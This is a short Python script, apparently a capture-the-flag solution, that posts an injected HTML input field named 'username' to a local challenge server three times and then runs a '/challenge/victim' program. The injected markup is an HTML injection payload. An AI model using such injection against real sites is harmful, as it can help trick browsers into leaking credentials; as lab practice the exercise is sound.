import sys
import requests
import os
from urllib.parse import quote,urlencode

url = "http://challenge.localhost/"

def sender():
    data = {
"content":"<input type=\"text\" name=\"username\">"
}
    return requests.post(url,data=data).text


for _ in range(3):
    sender()

import os
res = os.system('/challenge/victim')
print(res)
